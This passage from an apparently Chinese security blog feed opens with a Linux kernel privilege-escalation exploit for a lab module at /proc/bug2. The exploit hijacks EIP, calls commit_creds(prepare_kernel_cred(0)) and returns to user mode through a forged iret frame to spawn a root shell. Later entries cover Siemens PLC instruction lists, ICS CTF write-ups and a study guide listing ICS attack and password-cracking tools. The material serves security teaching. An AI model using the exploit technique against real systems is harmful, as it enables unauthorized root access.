title="EXP"></a>EXP</h2><p>拿到shell的思路还是利用commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，返回到用户模式执行iret指令。当使用iret指令返回到相同保护级别的任务时，iret会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。当使用iret指令返回到一个不同的保护级别时，iret不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。栈上保存了trap frame，返回到用户模式的时候恢复信息从以下结构读取。</p><pre><code>struct trap_frame{    void* eip;                // instruction pointer +0    uint32_t cs;            // code segment    +4    uint32_t eflags;        // CPU flags       +8    void* esp;                // stack pointer       +12    uint32_t ss;            // stack segment   +16} __attribute__((packed));</code></pre><p>那么get root shell的思路就是先去执行commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，执行起shell，也就是说先把当前进程权限提到root，然后执行起shell操作，那么我们就可以得到一个root的shell了。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;struct trap_frame{    void *eip;    uint32_t cs;    uint32_t eflags;    void *esp;    uint32_t ss;}__attribute__((packed));struct trap_frame tf;void get_shell(void){    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);}void init_tf_work(void){    asm(&quot;pushl %cs;popl tf+4;&quot; //set cs        &quot;pushfl;popl tf+8;&quot;  //set eflags        &quot;pushl %esp;popl tf+12;&quot;        &quot;pushl %ss;popl tf+16;&quot;);    tf.eip = &amp;get_shell;    tf.esp -= 1024;}#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067b20;void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067980;void payload(void){    //payload here        commit_creds(prepare_kernel_cred(0));    asm(&quot;mov $tf,%esp;&quot;       &quot;iret;&quot;);}int main(void){    char buf[24];    memset(buf,0x41,24);    *((void**)(buf+20)) = &amp;payload; //set eip to payload    init_tf_work();    write(1,buf,sizeof(buf));    int fd = open(&quot;/proc/bug2&quot;,O_WRONLY);    //exploit    write(fd,buf,sizeof(buf));    return 0;}</code></pre><p>调试EXP先要确定模块代码节地址。<br><img src="\images\pasted-279.png" alt="upload successful"><br>gdb中如图设置。<br><img src="\images\pasted-280.png" alt="upload successful"><br>然后就可以返回到系统中，运行EXP程序了。对ret指令下断，然后c过去，这时候单步的话，应该就ret到我们payload的地址了。<br><img src="\images\pasted-281.png" alt="upload successful"><br>查看一下栈顶的情况。<br><img src="\images\pasted-282.png" alt="upload successful"><br>接下来单步进入我们的payload。<br><img src="\images\pasted-283.png" alt="upload successful"><br>这里可以看到先去执行commit_creds(prepare_kernel_cred(0))了。<br><img src="\images\pasted-284.png" alt="upload successful"><br>我们主要关注iret。<br><img src="\images\pasted-285.png" alt="upload successful"><br>红色部分就是我们伪造的tf结构。<br><img src="\images\pasted-286.png" alt="upload successful"><br>这边可以看到eip指向是我们用来起shell的函数，这样看来整个payload结构是没什么问题的。<br><img src="\images\pasted-287.png" alt="upload successful"><br>成功拿到root shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kernel-exploitNULL-Dereference&quot;&gt;&lt;a href=&quot;#kernel-exploitNULL-Dereference&quot; class=&quot;headerlink&quot; title=&quot;kernel exploitNULL Dereference&quot;&gt;
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
    
      <category term="linux内核漏洞" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>西门子PLC指令表</title>
    <link href="http://yoururl.com/2018/08/05/%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%8C%87%E4%BB%A4%E8%A1%A8/"/>
    <id>http://yoururl.com/2018/08/05/西门子PLC指令表/</id>
    <published>2018-08-05T08:27:00.000Z</published>
    <updated>2018-08-05T08:36:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="位逻辑指令"><a href="#位逻辑指令" class="headerlink" title="位逻辑指令"></a>位逻辑指令</h1><p><img src="\images\pasted-221.png" alt="upload successful"><br><br><br></p><h1 id="时钟指令"><a href="#时钟指令" class="headerlink" title="时钟指令"></a>时钟指令</h1><p><img src="\images\pasted-222.png" alt="upload successful"><br><br><br></p><h1 id="通信指令"><a href="#通信指令" class="headerlink" title="通信指令"></a>通信指令</h1><p><img src="\images\pasted-223.png" alt="upload successful"><br><br><br></p><h1 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h1><p><img src="\images\pasted-224.png" alt="upload successful"><br><br><br></p><h1 id="转换指令"><a href="#转换指令" class="headerlink" title="转换指令"></a>转换指令</h1><p><img src="\images\pasted-225.png" alt="upload successful"><br><br><br></p><h1 id="计数器指令"><a href="#计数器指令" class="headerlink" title="计数器指令"></a>计数器指令</h1><p><img src="\images\pasted-226.png" alt="upload successful"><br><br><br></p><h1 id="浮点数运算指令"><a href="#浮点数运算指令" class="headerlink" title="浮点数运算指令"></a>浮点数运算指令</h1><p><img src="\images\pasted-227.png" alt="upload successful"><br><br><br></p><h1 id="整数运算指令"><a href="#整数运算指令" class="headerlink" title="整数运算指令"></a>整数运算指令</h1><p><img src="\images\pasted-228.png" alt="upload successful"><br><br><br></p><h1 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h1><p><img src="\images\pasted-229.png" alt="upload successful"><br><br><br></p><h1 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h1><p><img src="\images\pasted-230.png" alt="upload successful"><br><br><br></p><h1 id="程序控制指令"><a href="#程序控制指令" class="headerlink" title="程序控制指令"></a>程序控制指令</h1><p><img src="\images\pasted-231.png" alt="upload successful"><br><br><br></p><h1 id="传送指令"><a href="#传送指令" class="headerlink" title="传送指令"></a>传送指令</h1><p><img src="\images\pasted-232.png" alt="upload successful"><br><br><br></p><h1 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h1><p><img src="\images\pasted-233.png" alt="upload successful"><br><br><br></p><h1 id="字符串指令"><a href="#字符串指令" class="headerlink" title="字符串指令"></a>字符串指令</h1><p><img src="\images\pasted-234.png" alt="upload successful"><br><br><br></p><h1 id="表指令"><a href="#表指令" class="headerlink" title="表指令"></a>表指令</h1><p><img src="\images\pasted-235.png" alt="upload successful"><br><br><br></p><h1 id="定时器指令"><a href="#定时器指令" class="headerlink" title="定时器指令"></a>定时器指令</h1><p><img src="\images\pasted-236.png" alt="upload successful"><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;位逻辑指令&quot;&gt;&lt;a href=&quot;#位逻辑指令&quot; class=&quot;headerlink&quot; title=&quot;位逻辑指令&quot;&gt;&lt;/a&gt;位逻辑指令&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;\images\pasted-221.png&quot; alt=&quot;upload successful&quot;&gt;
      
    
    </summary>
    
      <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
    
      <category term="plc" scheme="http://yoururl.com/tags/plc/"/>
    
      <category term="梯形图" scheme="http://yoururl.com/tags/%E6%A2%AF%E5%BD%A2%E5%9B%BE/"/>
    
      <category term="西门子" scheme="http://yoururl.com/tags/%E8%A5%BF%E9%97%A8%E5%AD%90/"/>
    
  </entry>
  
  <entry>
    <title>西门子PLC梯形图说明</title>
    <link href="http://yoururl.com/2018/08/05/%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AF%B4%E6%98%8E/"/>
    <id>http://yoururl.com/2018/08/05/西门子PLC梯形图说明/</id>
    <published>2018-08-05T07:23:00.000Z</published>
    <updated>2018-08-05T08:38:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="位逻辑指令"><a href="#位逻辑指令" class="headerlink" title="位逻辑指令"></a>位逻辑指令</h1><pre><code>1.1  位逻辑指令概述1.2  -||- 常开接点(地址)1.3  -|/|-常闭接点(地址)1.4  XOR位异或1.5  -|NOT|- 信号流反向1.6  -( ) 输出线圈1.7  -(#)- 中间输出1.8  -(R) 线圈复位1.9  -(S) 线圈置位1.10  RS复位置位触发器1.11  RS置位复位触发器1.12  -(N)-RLO下降沿检测1.13  -(P)-PLO上升沿检测1.14  -(SAVE) 将RLO存入BR存储器1.15  MEG地址下降沿检测1.16  POS地址上升沿检测1.17  立即读操作1.18  立即写操作</code></pre><p><br><br></p><h1 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h1><pre><code>2.1  比较指令概述2.2  CMP?I整数比较2.3  CMP?D双整数比较2.4  CMP?R实数比较</code></pre><p><br><br></p><h1 id="转换指令"><a href="#转换指令" class="headerlink" title="转换指令"></a>转换指令</h1><pre><code>3.1   转换指令概述3.2   BCD_IBCD码转换为整数3.3   I_BCD整数转换为BCD码3.4   I_DINT整数转换为双整数3.5   BCD_DIBCD码转换为双整数3.6   DI_BCD双整数转换为BCD码3.7   DI_REAL双整数转换为浮点数3.8   INV_I整数的二进制反码3.9   INV_DI双整数的二进制反码3.10   NEG_I整数的二进制补码3.11   NEG_DI双整数的二进制补码3.12   NEG_R浮点数求反3.13   ROUND舍入为双整数3.14   TRUNC舍去小数取整为双整数3.15   CEIL上取整3.16   FLOOR下取整</code></pre><p><br><br></p><h1 id="计数器指令"><a href="#计数器指令" class="headerlink" title="计数器指令"></a>计数器指令</h1><pre><code>4.1  计数器指令概述4.2  S_CUD加减计数4.3  S_CU加计数器4.4  S_CD减计数器4.5  -(SC)计数器置初值4.6  -(CU)加计数器线圈4.7  -(CD)减计数器线圈</code></pre><p><br><br></p><h1 id="数据块指令"><a href="#数据块指令" class="headerlink" title="数据块指令"></a>数据块指令</h1><pre><code>5.1  -(OPN)打开数据块:DB或DI</code></pre><p><br><br></p><h1 id="逻辑控制指令"><a href="#逻辑控制指令" class="headerlink" title="逻辑控制指令"></a>逻辑控制指令</h1><pre><code>6.1  逻辑控制指令概述6.2  -(JMP)- 无条件跳转6.3  -(JMP)- 条件跳转6.4  -(JMPN)- 若非则跳转6.5  LABEL标号</code></pre><p><br><br></p><h1 id="整数算术运算指令"><a href="#整数算术运算指令" class="headerlink" title="整数算术运算指令"></a>整数算术运算指令</h1><pre><code>7.1  整数算术运算指令概述7.2  判断整数算术运算指令后状态字的位7.3  ADD_I 整数加法7.4  SUB_I 整数减法7.5  MUL_I 整数乘法7.6  DIV_I 整数除法7.7  ADD_DI 双整数加法7.8  SUB_DI 双整数减法7.9  MUL_DI 双整数乘法7.10  DIV_DI 双整数除法7.11  MOD_DI 回送余数的双整数</code></pre><p><br><br></p><h1 id="浮点算术运算指令"><a href="#浮点算术运算指令" class="headerlink" title="浮点算术运算指令"></a>浮点算术运算指令</h1><pre><code>8.1  浮点算术运算指令概述8.2  判断浮点算术运算指令后状态字的位8.3  基础指令8.3.1  ADD_R实数加法8.3.2  SUB_R实数减法8.3.3  MUL_R实数乘法8.3.4  DIV_R实数除法8.3.5  ABS浮点数绝对值运算8.4  扩展指令8.4.1  SQR浮点数平方8.4.2  SQRT浮点数平方根8.4.3  EXP浮点数指数运算8.4.4  LN浮点数自然对数运算8.4.5  SIN浮点数正弦运算8.4.6  COS浮点数余弦运算8.4.7  TAN浮点数正切运算8.4.8  ASIN浮点数反正弦运算8.4.9  ACOS浮点数反余弦运算8.4.10  ATAN浮点数反正切运算</code></pre><p><br><br></p><h1 id="赋值指令"><a href="#赋值指令" class="headerlink" title="赋值指令"></a>赋值指令</h1><pre><code>9.1   MOVE赋值</code></pre><p><br><br></p><h1 id="程序控制指令"><a href="#程序控制指令" class="headerlink" title="程序控制指令"></a>程序控制指令</h1><pre><code>10.1  程序控制指令概述10.2  -(Call)从线圈调用FC/SFC(无参数)10.3  CALL_FB从方块调用FB10.4  CALL_FC从方块调用FC10.5  CALL_SFB从方块调用SFB10.6  CALL_SFC从方块调用SFC10.7  调用多北京块10.8  从库中调用块10.9  使用MCR功能的重要注意事项10.10  -(MCR&lt;)主控继电器接通10.11  -(MCR&gt;)主控继电器断开10.12  -(MCRA)主控继电器启动10.13  -(MCRD)主控继电器停止10.14  -(RET)返回</code></pre><p><br><br></p><h1 id="移位和循环指令"><a href="#移位和循环指令" class="headerlink" title="移位和循环指令"></a>移位和循环指令</h1><pre><code>11.1   移位指令11.1.1   移位指令概述11.1.2   SHR_I整数右移11.1.3   SHR_DI双整数右移11.1.4   SHL_W字左移11.1.5   SHR_W字右移11.1.6   SHL_DW双字左移11.1.7   SHR_DW双字右移11.2   循环指令11.2.1   循环指令概述11.2.2   ROL_DW双字左循环11.2.3   ROR_DW双字右循环</code></pre><p><br><br></p><h1 id="状态位指令"><a href="#状态位指令" class="headerlink" title="状态位指令"></a>状态位指令</h1><pre><code>12.1   状态位指令概述12.2   OV -||- 溢出异常位12.3   OS -||- 存储溢出异常位12.4   UO -||- 无序异常位12.5   BR -||- 异常位二进制结果12.6   ==0-||- 结果位等于&quot;0&quot;12.7   &lt;&gt;0-||- 结果位不等于&quot;0&quot;12.8   &gt;0-||- 结果位大于&quot;0&quot;12.9   &lt;0-||- 结果位小于&quot;0&quot;12.10   &gt;=0-||- 结果位大于等于&quot;0&quot;12.11   &lt;=0-||- 结果位小于等于&quot;0&quot;</code></pre><p><br><br></p><h1 id="定时器指令"><a href="#定时器指令" class="headerlink" title="定时器指令"></a>定时器指令</h1><pre><code>13.1   定时器指令概述13.2   存储区中定时器的存储单元和定时器的组成部分13.3   S_PULSE脉冲S5定时器13.4   S_PEXT扩展脉冲S5定时器13.5   S_ODT接通延时S5定时器13.6   S_ODTS保持型接通延时S5定时器13.7   S_OFFDT断电延时S5定时器13.8   -(SP)脉冲定时器线圈13.9   -(SE)扩展脉冲定时器线圈13.10   -(SD)接通延时定时器线圈13.11   -(SS)保持型接通延时定时器线圈13.12   -(SF)断开延时定时器线圈</code></pre><p><br><br></p><h1 id="字逻辑指令"><a href="#字逻辑指令" class="headerlink" title="字逻辑指令"></a>字逻辑指令</h1><pre><code>14.1   字逻辑指令概述14.2   WAND_W字和字相&quot;与&quot;14.3   WOR_W字和字相&quot;或&quot;14.4   WAND_DW双字和双字相&quot;与&quot;14.5   WOR_DW双字和双字相&quot;或&quot;14.6   WXOR_W字和字相&quot;异或&quot;14.7   WXOR_DW双字和双字相&quot;异或</code></pre><p><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;位逻辑指令&quot;&gt;&lt;a href=&quot;#位逻辑指令&quot; class=&quot;headerlink&quot; title=&quot;位逻辑指令&quot;&gt;&lt;/a&gt;位逻辑指令&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;1.1  位逻辑指令概述
1.2  -||- 常开接点(地址)
1.3  -|/|-常闭接点(地址)
      
    
    </summary>
    
      <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
    
      <category term="plc" scheme="http://yoururl.com/tags/plc/"/>
    
      <category term="梯形图" scheme="http://yoururl.com/tags/%E6%A2%AF%E5%BD%A2%E5%9B%BE/"/>
    
      <category term="西门子" scheme="http://yoururl.com/tags/%E8%A5%BF%E9%97%A8%E5%AD%90/"/>
    
  </entry>
  
  <entry>
    <title>梯形图计算writeup</title>
    <link href="http://yoururl.com/2018/08/05/%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AE%A1%E7%AE%97writeup/"/>
    <id>http://yoururl.com/2018/08/05/梯形图计算writeup/</id>
    <published>2018-08-05T06:20:00.000Z</published>
    <updated>2018-08-05T16:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>2018年工业信息安全技能大赛(华中赛区)</em></strong>两道梯形图计算题，请教了学弟记录一下write up</p><h1 id="梯形图计算1"><a href="#梯形图计算1" class="headerlink" title="梯形图计算1"></a>梯形图计算1</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong><em>分析当M0.0=1时，PLC程序的运算结果为多少？</em></strong></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="\images\pasted-210.png" alt="upload successful"><br><img src="\images\pasted-211.png" alt="upload successful"><br>全都是Q0.1决定的，所以Q0.1肯定是1。<br>程序段3这里是模拟信号5.045000<em>10^001=50.45<br>程序段3这里是模拟信号4.000000</em>10^001=40<br>OUT为50.45<em>40=2018<br>flag是**</em>2018***<br><br><br><br></p><h1 id="梯形图计算2"><a href="#梯形图计算2" class="headerlink" title="梯形图计算2"></a>梯形图计算2</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p><strong><em>分析当M10.0=1时，PLC程序的运算结果为多少？</em></strong><br><img src="\images\pasted-212.png" alt="upload successful"><br><img src="\images\pasted-213.png" alt="upload successful"><br><img src="\images\pasted-214.png" alt="upload successful"><br><img src="\images\pasted-215.png" alt="upload successful"></p><h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p><img src="\images\pasted-216.png" alt="upload successful"><br><img src="\images\pasted-217.png" alt="upload successful"><br><img src="\images\pasted-218.png" alt="upload successful"><br><strong><em>逆向分析</em></strong><br>先看程序段4，求Tag_10,是由Tag_9和Tag_8决定的，并且Tag_2一定是1，Tag_8，Tag_9是SWAP的关系  <em><br>再看程序段3，Tag_8 = Tag_7 </em> 100<br>再看程序段2，Tag_7 = Tag_4<br>再看程序段2，Tag_4 = 5<br>可以推出：<br>Tag_4：5<br>Tag_7：5<br>Tag_8：500==0x01f4==0000000111110100<br>Tag_9：0xf401==1111010000000001<br><img src="\images\pasted-220.png" alt="upload successful"><br>Tag_10：<strong><em>5f5f</em></strong><br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;2018年工业信息安全技能大赛(华中赛区)&lt;/em&gt;&lt;/strong&gt;两道梯形图计算题，请教了学弟记录一下write up&lt;/p&gt;
&lt;h1 id=&quot;梯形图计算1&quot;&gt;&lt;a href=&quot;#梯形图计算1&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
    
      <category term="ctf" scheme="http://yoururl.com/tags/ctf/"/>
    
      <category term="write up" scheme="http://yoururl.com/tags/write-up/"/>
    
      <category term="plc" scheme="http://yoururl.com/tags/plc/"/>
    
      <category term="梯形图" scheme="http://yoururl.com/tags/%E6%A2%AF%E5%BD%A2%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>工控流量分析writeup</title>
    <link href="http://yoururl.com/2018/08/04/%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90writeup/"/>
    <id>http://yoururl.com/2018/08/04/工控流量分析writeup/</id>
    <published>2018-08-04T02:27:00.000Z</published>
    <updated>2018-08-05T08:34:14.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>2018年工业信息安全技能大赛(华中赛区)</em></strong>的几道流量分析题，抽时间写一下write up<br><br><br><br></p><h1 id="工业协议分析3"><a href="#工业协议分析3" class="headerlink" title="工业协议分析3"></a>工业协议分析3</h1><p>先过滤modbus的包，保存为分组字节流502.pcap<br><img src="\images\pasted-193.png" alt="upload successful"><br>再用流量分析脚本（ics_packet_analysis.py），按照数据包长度分流，可以吧不同长度的数据包分处理，方便分析<br><img src="\images\pasted-194.png" alt="upload successful"><br><img src="\images\pasted-195.png" alt="upload successful"><br>直接打印出了这个数据包且将这个数据包以pcap的形式存储下来，用wireshark打开，分析可知这个长度全部都是Wirte Multiple Register功能的包，仔细分析一下<br><img src="\images\pasted-196.png" alt="upload successful"><br>发现可以字符串，modbus中通信是一发一收，不可能有连续的可见数据，可判断这就是恶意流量<br><img src="\images\pasted-197.png" alt="upload successful"><br>尝试16进制解密字符串，拿到flag<br><img src="\images\pasted-198.png" alt="upload successful"><br><br><br><br></p><h1 id="工业协议分析4"><a href="#工业协议分析4" class="headerlink" title="工业协议分析4"></a>工业协议分析4</h1><p>由于流量脚本分析工具只能识别pcap包，所以这里要转换一下<br>wireshark打开，导出特定分组字节，保存位pcap格式即可<br>顺便在过滤一下与工控流量无关的包<br><img src="\images\pasted-199.png" alt="upload successful"><br>继续用流量分析脚本工具，分流，分析<br><img src="\images\pasted-200.png" alt="upload successful"><br>分析一下，例如长度为40的包 没有数据，所以不是要分析的modbus的包，我们来看长度为52的这个包packets_52.pcap<br><img src="\images\pasted-201.png" alt="upload successful"><br>有Read Coils，Read Holiding Registers，Read Input Register三种功能的包，但都是正常的寄存器读写操作，没有异常流量<br>再看长度为115的包，是s7comm协议<br>追踪TCP流，转为Hex去看，然后找不到……<br>回过头在分组字节流重新找，找到有一个重传的异常包<br><img src="\images\pasted-202.png" alt="upload successful"><br>16进制解码4943532657696e7365637572697479，拿到flag<br><img src="\images\pasted-203.png" alt="upload successful"><br><br><br><br></p><h1 id="电力系统协议分析"><a href="#电力系统协议分析" class="headerlink" title="电力系统协议分析"></a>电力系统协议分析</h1><p>直接追踪流，转为Hex转储分析<br>分析可知，这里似乎列出一个文件目录<br><img src="\images\pasted-204.png" alt="upload successful"><br>然后似乎就是一直打开文件，读取文件，关闭文件<br><img src="\images\pasted-205.png" alt="upload successful"><br>这里追踪到可疑文件<br><img src="\images\pasted-206.png" alt="upload successful"><br><img src="\images\pasted-207.png" alt="upload successful"><br><img src="\images\pasted-208.png" alt="upload successful"><br><img src="\images\pasted-209.png" alt="upload successful"><br>flag就是这filedata中的数据<strong><em>61850@102</em></strong><br><br><br><br></p><h1 id="PLC通信协议分析"><a href="#PLC通信协议分析" class="headerlink" title="PLC通信协议分析"></a>PLC通信协议分析</h1><p>这道题问设备地址，私有协议比较难分析，最后也没做出来…<br>后来想想设备地址似乎就两位16进制数，按照比赛要求同一道题两次提交时间间隔30s，也就是说爆破flag似乎也就是只用两个小时…<br>emmm还是我们太乖了…<br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;2018年工业信息安全技能大赛(华中赛区)&lt;/em&gt;&lt;/strong&gt;的几道流量分析题，抽时间写一下write up&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
&lt;h1 id=&quot;工业协议分析3&quot;&gt;&lt;a href=&quot;#工业协议分析3&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
    
      <category term="modbus" scheme="http://yoururl.com/tags/modbus/"/>
    
      <category term="ctf" scheme="http://yoururl.com/tags/ctf/"/>
    
      <category term="write up" scheme="http://yoururl.com/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>工控学习主要科目</title>
    <link href="http://yoururl.com/2018/08/03/%E5%B7%A5%E6%8E%A7%E5%AD%A6%E4%B9%A0%E4%B8%BB%E8%A6%81%E7%A7%91%E7%9B%AE/"/>
    <id>http://yoururl.com/2018/08/03/工控学习主要科目/</id>
    <published>2018-08-02T17:23:00.000Z</published>
    <updated>2018-08-02T17:54:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工业控制系统概述"><a href="#工业控制系统概述" class="headerlink" title="工业控制系统概述"></a>工业控制系统概述</h1><p>目的：简单的了解什么是工业控制系统、工业控制系统框架、工业控制系统安全现状等理论基础知识，在对工业控制系统有了一定的了解后在展开实践。<br>学习方法：通过网上搜集相关资料进行学习，最好直接看一些工控安全的相关书籍，书籍里都讲的很清楚。下面推荐几本入门书籍：<br>1.《黑客大曝光：工业控制系统安全》<br>2.《工业控制网络安全技术与实践》<br>3.《S7-300/400 PLC应用技术》<br>4……<br><br><br><br></p><h1 id="工业控制系统的组态和编程"><a href="#工业控制系统的组态和编程" class="headerlink" title="工业控制系统的组态和编程"></a>工业控制系统的组态和编程</h1><p>目的：了解PLC的架构与特点，认识PLC的硬件及网络组态、学习PLC程序的基础编写，使用TIA对S7-300进行硬件组态和PLC编程。<br>学习方法：学会控制器的组态方法，多看说明文档，能够读懂简单的梯形图控制逻辑和其他的基于IEC61131-3的五种工控编程语言，并进行简单的编程，使用真实的PLC设备进行实操，如国内外的PLC，西门子、施耐德、ABB、和利时、大工计控、优稳……（一般入门都是从西门子的PLC开始）设备能够跑起来是第一步，接下来就可以做一些事了。<br><br><br><br></p><h1 id="常用的工业控制系统协议分析"><a href="#常用的工业控制系统协议分析" class="headerlink" title="常用的工业控制系统协议分析"></a>常用的工业控制系统协议分析</h1><p>要求：分析常用的工业以太网协议，如Modbus、S7comm、IEC61850、EtherNet/IP、DNP3、EPA等等协议，了解这些工业以太网协议的协议规范和存在的安全性问题。<br>学习方法：有真实设备的可以直接使用真实设备进行分析、无真实设备的可以从网上下载相关的协议数据包进行离线分析，通过对协议的不断了解，要形成对这些协议的模糊测试工具。<br><br><br><br></p><h1 id="工控软硬件漏洞挖掘"><a href="#工控软硬件漏洞挖掘" class="headerlink" title="工控软硬件漏洞挖掘"></a>工控软硬件漏洞挖掘</h1><p>工业控制系统的漏洞挖掘主要包含三部分，上位机软件漏洞挖掘、工控协议的漏洞挖掘，控制器设备固件漏洞挖掘。其中最简单的是工控协议漏洞挖掘，上手比较快，需要具备一定的工控协议逆向能力，其他两方面需要一定的基础才能精心研究。<br>学习方法：首先对协议进行分析，然后编写模糊测试脚本，最后进行测试和分析。开始研究是可以找一些已有的漏洞，先复现他的攻击过程，在分析器攻击机理，从而能够举一反三，发掘0day漏洞。<br><br><br><br></p><h1 id="工控系统攻击工具使用"><a href="#工控系统攻击工具使用" class="headerlink" title="工控系统攻击工具使用"></a>工控系统攻击工具使用</h1><p>想要做一些工控安全的研究，光靠自己琢磨效率低下，需要借助前人已有的成果进行研究和学习。其中涉及到很多实用的工具，我们需要建立自己的工具集，这里列出一些常用的工具：<br>（1）S7 Client Demo开源的S7协议库”snap7“基础上进行开发的，主要支持西门子的S7-300/s7-400设备，可以直接连接西门子的控制器，获取控制器上的设备信息（如固件版本，块信息等），还可以直接操作控制器的CPU的启停。<br>（2）PLCSCAN、NMAP中的工控设备扫描模块通过探测设备，获取关于设备的供应商类型、模块信息等，目前仅支持S7协议与MODBUS协议。<br>（3）ISF该框架主要使用Python语言开发，集成了ShadowBroker释放的NSA工具Fuzzbunch攻击框架，是一款适合工控漏洞利用的框架。其中集成很多常用的针对工控安全的攻击集。<br>（4）GrassMarlinGRASSMARLIN是一款由美国国家安全局开发的，能够帮助运维工程师在IP网络上发现并编目监控和数据采集系统（SCADA）和工业控制系统（ICS）主机的开源软件工具，也被称为被动网络映射器。其数据源十分多样化，包括PCAP文件、路由器和交换机配置文件、CAM表以及实时网络数据包的捕获。该工具能够自动识别可用网络，生成网络拓扑，实现主机间通信的可视化，还能够展示从主机通信中所提取的元数据。<br>（5）S7-Brute-OfflineS7密码离线暴力破解工具。<br>（6）SCADA_Metasploit_Modules列举了MSF上所有的针对工业控制系统的漏洞脚本。<br>（7）Scada_Password列举了工业控制系统中的常见的用户和密码。<br>（8）SmodModbus模糊测试工具。<br>（9）PLCinject<br>（10）Modscan<br>（11）…<br>这里就不一一列举了，用到的使用自己去找吧，最后我这里给出几个github上对工控资源整合的网站：<br><a href="https://github.com/zhangdebiao/icsmaster" target="_blank" rel="noopener">https://github.com/zhangdebiao/icsmaster</a><br><a href="https://github.com/zhangdebiao/ICS-Security-Tools" target="_blank" rel="noopener">https://github.com/zhangdebiao/ICS-Security-Tools</a><br><a href="https://github.com/zhangdebiao/awesome-industrial-control-system-security" target="_blank" rel="noopener">https://github.com/zhangdebiao/awesome-industrial-control-system-security</a> &emsp;&emsp;&emsp;<a href="http://www.freebuf.com/sectool/174567.html" target="_blank" rel="noopener">FREEBUF</a><br>这几个链接中整合了国内外和工控安全相关的顶会文章，工控系统的利用脚本、常用的攻击工具、工控协议相关的数据包和协议文档等等。<br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工业控制系统概述&quot;&gt;&lt;a href=&quot;#工业控制系统概述&quot; class=&quot;headerlink&quot; title=&quot;工业控制系统概述&quot;&gt;&lt;/a&gt;工业控制系统概述&lt;/h1&gt;&lt;p&gt;目的：简单的了解什么是工业控制系统、工业控制系统框架、工业控制系统安全现状等理论基础知识，在
      
    
    </summary>
    
      <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
    
      <category term="工控安全" scheme="http://yoururl.com/tags/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Modbus学习笔记</title>
    <link href="http://yoururl.com/2018/08/03/Modbus%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoururl.com/2018/08/03/Modbus学习笔记/</id>
    <published>2018-08-02T16:09:00.000Z</published>
    <updated>2018-08-05T08:34:30.000Z</updated>
    
